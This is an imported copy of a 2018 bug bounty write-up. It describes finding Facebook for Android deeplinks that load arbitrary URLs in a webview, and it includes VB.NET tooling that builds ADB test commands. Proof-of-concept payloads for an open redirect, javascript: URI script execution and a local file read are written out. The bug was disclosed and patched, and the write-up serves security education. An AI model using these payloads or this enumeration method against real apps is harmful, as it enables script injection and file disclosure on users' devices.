---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-09-09_making-the-facebook-app-more-secure-8500-bounty.md
original_filename: 2018-09-09_making-the-facebook-app-more-secure-8500-bounty.md
title: Making the Facebook app more secure - $8500 bounty
category: documents
detected_topics:
- ssrf
- xss
- sqli
- command-injection
- path-traversal
- otp
tags:
- imported
- documents
- ssrf
- xss
- sqli
- command-injection
- path-traversal
- otp
language: en
raw_sha256: 8a8314cdbc851ff50699b03d4d484dde83cba0472490b1cb4ffabd274a685c49
text_sha256: 1e4eea4adb9a450d23ba66b91d8b63b6eb5426d26f00ac07864879b91ab1ca9f
ingested_at: '2026-06-28T07:31:57Z'
sensitivity: unknown
redactions_applied: false
---

# Making the Facebook app more secure - $8500 bounty

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-09-09_making-the-facebook-app-more-secure-8500-bounty.md
- Source Type: markdown
- Detected Topics: ssrf, xss, sqli, command-injection, path-traversal, otp
- Ingested At: 2026-06-28T07:31:57Z
- Redactions Applied: False
- Raw SHA256: `8a8314cdbc851ff50699b03d4d484dde83cba0472490b1cb4ffabd274a685c49`
- Text SHA256: `1e4eea4adb9a450d23ba66b91d8b63b6eb5426d26f00ac07864879b91ab1ca9f`


## Content

---
title: "Making the Facebook app more secure - $8500 bounty"
page_title: "Ashley King - Making the Facebook app more secure - $8500 bounty"
url: "https://ash-king.co.uk/facebook-bug-bounty-09-18.html"
final_url: "https://ash-king.co.uk/facebook-bug-bounty-09-18.html"
authors: ["Ashley King (@AshleyKingUK)"]
programs: ["Meta / Facebook"]
bugs: ["Open redirect"]
bounty: "8,500"
publication_date: "2018-09-09"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5711
---

## Summary

Whilst working on the Facebook Bug Bounty Program in June 2018 we had identified an issue with the webview component used in the Facebook for Android application. The vulnerability would allow an attacker to execute arbitrary javascript within the Android application by just clicking a single link. 

I was able to execute this at 3 different end points before we concluded the issue was primarily with the webview component rather than just the reported end points themselve. After going back and forth with the Facebook security team they quickly patched the issue and I was rewarded with $8500 under their Bug Bounty Program. 

## 🕵 Reconnaissance

Recon plays a big part in the bug bounty world. Getting to know your target is key and helps you focus your time in the relevant places. During the recon for Facebook Android I was primarily focusing on one thing, that was deeplinks. 

A deeplink is another type of hyperlink that will take you to a specific activity within an application. For example: <fb://profile/1395634905> clicking this URL on an Android device will launch the Facebook application and take you directly to my Facebook profile. 

I decided to look into the APK file to see what plain text was visible, so I opened the latest APK in WinRAR and searched for the string 'fb://' which pulled back one file 'assets/Bundle-fb4.js.hbc'. This file had multiple deeplinks which included fb://marketplace_product_details_from_for_sale_item_id and fb://adsmanager but they were nothing to get excited about. 

However one deeplink (fb://ama/) was quite fruitful. The URL didn't do alot itself but after searching for 'ama' in Winrar the APK revealed a file called 'react_native_routes.json'. This was the gold mine, it contained most of the deeplinks that Facebook can handle. ![](/assets/img/nativeroutes.png)

Using the above image we can craft together a valid Facebook deeplink: 
  
  
  fb://ama/?entryPoint={STRING}&fb_hidesTabBar={STRING}&presentationMethod={STRING}&targetURI={STRING}

This file consisted of over 12,000 lines so I needed a bit of programmatic help to gather all valid links. I knocked up 2 quick applications, one to convert the JSON into a database structure and the second to create links from the database. I went down that database route just incase I needed to manipulate the data at a later point. 
  
  
  Moving JSON into a database structure  
  Imports System.Data.SQLite
  Imports System.IO
  Imports Newtonsoft.Json.Linq
  
  Module Module1
  
  Sub Main(args() As String)
  ProcessFile("react_native_routes.json")
  End Sub
  
  Public Sub ProcessFile(InputFile As String)
  Dim JSONText = File.ReadAllText(InputFile)
  If JSONText.StartsWith("[") Then
  'Make valid JSON
  JSONText = "{'results' : " & JSONText & " }"
  End If
  Dim json As JObject = JObject.Parse(JSONText)
  Dim arr As JArray = json.SelectToken("results")
  
  For i = 0 To arr.Count - 1
  Try
  Dim RouteName As String = arr(i).SelectToken("name")
  Dim RoutePath As String = arr(i).SelectToken("path")
  Dim paramJSON As JObject = arr(i).SelectToken("paramDefinitions")
  Dim RouteParamateCount As Integer = arr(i).SelectToken("paramDefinitions").Count
  
  If RouteParamateCount <> 0 Then
  Dim o As Integer = 0
  Dim RouteID As Integer = insertRoute(RouteName, RoutePath, RouteParamateCount)
  For Each item As JProperty In arr(i).SelectToken("paramDefinitions")
  o += 1
  Dim ParamName = item.Name
  Dim ParamType = item.Value("type").ToString
  Dim ParamRequired = item.Value("required").ToString
  insertParamater(ParamName, ParamType, ParamRequired, o, RouteID)
  Next
  End If
  Catch ex As Exception
  End Try
  Next
  End Sub
  
  Public Function insertRoute(RouteName As String, RoutePath As String, 
  RouteParamaterCount As Integer) As Integer
  Dim con As New SQLiteConnection("Data Source=FBNativeRoutes.db")
  con.Open()
  Dim sql As String = "INSERT INTO RouteTable 
  (RouteName, RoutePath, RouteParamaterCount, RouteAddedDateTime) 
  VALUES 
  (@RN, @RP, @RPC, @RAD)"
  Dim cmd As New SQLiteCommand(sql, con)
  cmd.Parameters.Add("RN", SqlDbType.VarChar).Value = RouteName
  cmd.Parameters.Add("RP", SqlDbType.VarChar).Value = RoutePath
  cmd.Parameters.Add("RPC", SqlDbType.Int).Value = RouteParamaterCount
  cmd.Parameters.Add("RAD", SqlDbType.Int).Value = Date.Now.Ticks
  cmd.ExecuteNonQuery()
  sql = "SELECT last_insert_rowid()"
  cmd = New SQLiteCommand(sql, con)
  insertRoute = cmd.ExecuteScalar()
  con.Close()
  End Function
  
  Public Sub insertParamater(ParamaterName As String, ParamaterType As String, ParamaterRequired As Boolean, 
  ParamaterOrderIndex As Integer, RouteID As Integer)
  Dim PR As Integer = 0
  If ParamaterRequired = True Then
  PR = 1
  Else
  PR = 0
  End If
  Dim con As New SQLiteConnection("Data Source=FBNativeRoutes.db")
  con.Open()
  Dim sql As String = "INSERT INTO ParamaterTable 
  (ParamaterName, ParamaterType, ParamaterRequired, ParamaterOrderIndex, RoutesID) 
  VALUES 
  (@PN, @PT, @PR, @POI, @RID)"
  Dim cmd As New SQLiteCommand(sql, con)
  cmd.Parameters.Add("PN", SqlDbType.VarChar).Value = ParamaterName
  cmd.Parameters.Add("PT", SqlDbType.VarChar).Value = ParamaterType
  cmd.Parameters.Add("PR", SqlDbType.Int).Value = ParamaterRequired
  cmd.Parameters.Add("POI", SqlDbType.Int).Value = PR
  cmd.Parameters.Add("RID", SqlDbType.Int).Value = RouteID
  cmd.ExecuteNonQuery()
  con.Close()
  End Sub
  
  End Module

The above code (VB.NET) would parse each 'path' in the JSON to its own entry in the RouteTable along with its name and the amount of paramaters. Likewise with the the actual paramaters, they would be stored in the ParamterTable. Storing the paramater type, name, index and whether it's a required field as well as the link back to the Route. 

The following code processes the SQLlite database and provides a list of command lines to execute the deeplink on an android device via ADB. 
  
  
  Building ADB commands ready for breaking 🕵Imports System.Data.SQLite
  Imports System.IO
  
  
  Module Module1
  
  Sub Main(args() As String)
  Dim FilePath As String = Date.Now.ToString("ddMMyyHHmm") & ".txt"
  Dim FBLink As String = ""
  Dim con As New SQLiteConnection("Data Source=FBNativeRoutes.db")
  con.Open()
  Dim sql As String = "SELECT RouteID, RouteName, RoutePath FROM RouteTable"
  Dim cmd As New SQLiteCommand(sql, con)
  Dim reader As SQLiteDataReader = cmd.ExecuteReader()
  If reader.HasRows Then
  Using sw As StreamWriter = New StreamWriter(FilePath)
  While reader.Read
  FBLink = BuildLink(reader("RouteID"), reader("RouteName"), reader("RoutePath"))
  FBLink = "adb shell am start -a ""android.intent.action.VIEW"" -d """ & FBLink & """"
  sw.WriteLine(FBLink)
  End While
  End Using
  End If
  reader.Close()
  con.Close()
  End Sub
  
  Public Function BuildLink(RouteID As Integer, RouteName As String, RoutePath As String) As String
  BuildLink = $"fb:/{RoutePath}/"
  Dim i As Integer = 0
  Dim con As New SQLiteConnection("Data Source=FBNativeRoutes.db")
  con.Open()
  Dim sql As String = "SELECT ParamaterName, ParamaterType, ParamaterRequired FROM ParamaterTable 
  WHERE RoutesID = @RID"
  Dim cmd As New SQLiteCommand(sql, con)
  cmd.Parameters.Add("RID", SqlDbType.Int).Value = RouteID
  Dim reader As SQLiteDataReader = cmd.ExecuteReader()
  If reader.HasRows Then
  While reader.Read()
  If i = 0 Then
  BuildLink &= "?" & reader("ParamaterName") & "=" & getValidValue(reader("ParamaterType"))
  Else
  BuildLink &= "\&" & reader("ParamaterName") & "=" & getValidValue(reader("ParamaterType"))
  End If
  i += 1
  End While
  End If
  reader.Close()
  con.Close()
  End Function
  
  Public Function getValidValue(ParamaterType As String) As String
  Select Case ParamaterType
  Case "String"
  Return "{STRING}"
  Case "Int"
  Return "{INT}"
  Case "Boolean"
  Return "{BOOLEAN}"
  Case Else
  Return "{STRING}"
  End Select
  End Function
  End Module

Using the AMA deeplink as an example, this is what the parsed endpoint will look like: 
  
  
  adb shell am start -a "android.intent.action.VIEW" -d "fb://ama/?entryPoint={STRING}\&fb_hidesTabBar={STRING}\&presentationMethod={STRING}\&targetURI={STRING}"

This would allow me to open the fb:// url via a command line which made the process of checking each URL a million times quicker. 

## Finding the vulnerability

![](/assets/img/blog/adblist.png)

  
Now we have a list of 364 pre-built command lines it was time to bruteforce and see what kind of responses I get out of them. There were a few interesting ones on the way but the three that we're going to take a look at are: 
  
  
  adb shell am start -a "android.intent.action.VIEW" -d "fb://payments_add_paypal/?url={STRING}"
  
  
  adb shell am start -a "android.intent.action.VIEW" -d "fb://ig_lwicreate_instagram_account_full_screen_ad_preview/?adPreviewUrl={STRING}"
  
  
  adb shell am start -a "android.intent.action.VIEW" -d "fb://ads_payments_prepay_webview/?account={STRING}\&contextID={STRING}\&paymentID={STRING}\&url={STRING}\&originRootTag={INTEGER}"

All three of these deeplinks have one thing in common, the URL paramter. 

So, given the paramater is requiring a URL I provided what it wanted. My first payload was: 
  
  
  adb shell am start -a "android.intent.action.VIEW" -d "fb://ig_lwicreate_instagram_account_full_screen_ad_preview/?adPreviewUrl=https://google.com"

The result: 

![](assets/img/blog/fbopenredirect.png)

  
Success! We have our first bug. An open redirect, Facebook take pride in eliminating certain vulnerabilities such as SSRF and Open redirects so this ones pretty cool but by itself will most likely be a small payout ($500). 

The next step is to see what else we can do with this endpoint. So what about using the javscript URI scheme rather than http/https? Also, can I read local files? 
  
  
  adb shell am start -a "android.intent.action.VIEW" -d "fb://ig_lwicreate_instagram_account_full_screen_ad_preview/?adPreviewUrl=javascript:confirm('https://facebook.com/Ashley.King.UK')"
  
  
  adb shell am start -a "android.intent.action.VIEW" -d "fb://ig_lwicreate_instagram_account_full_screen_ad_preview/?adPreviewUrl=file:///sdcard/CDAInfo.txt"

To my suprise, they both worked! 

![](assets/img/blog/fbxss.png) ![](assets/img/blog/fblfi.png)

  
I spent a good few hours trying to chain the bugs, exploit them further but had no success. I was tackling the issues from a black box testing perspective and without source code I feel I couldn't take it any further. It was time to report the end points to Facebook. 

## Timeline

  * Reported to Facebook - 30th March
  * First Response - 4th April
  * Confirmed Patched - 13th April
  * Bounty received - 16th May

## Response from Lukas, Facebook Security Team

> Your report brought to our attention that those endpoints can be invoked from any web page, which on its own would have quite a limited impact. The most impactful issue here would have been the local file disclosure in the UI. (which would require local access to the device to exfiltrate it)  
>  
>  However, a code review of the WebViews uncovered several other issues that could be chained with the bug reported by you. Those were related to the actual configuration and implementation of the WebView. Chained those could have allowed an attacker to invoke some internal endpoints of the application and access sensitive HTML5 APIs.  
>  
>  As per our bounty policy we are determining bounties based on the highest potential security risk. Since our internal investigation uncovered several deeper underlying issues here we are awarding you for those internal discoveries as well.
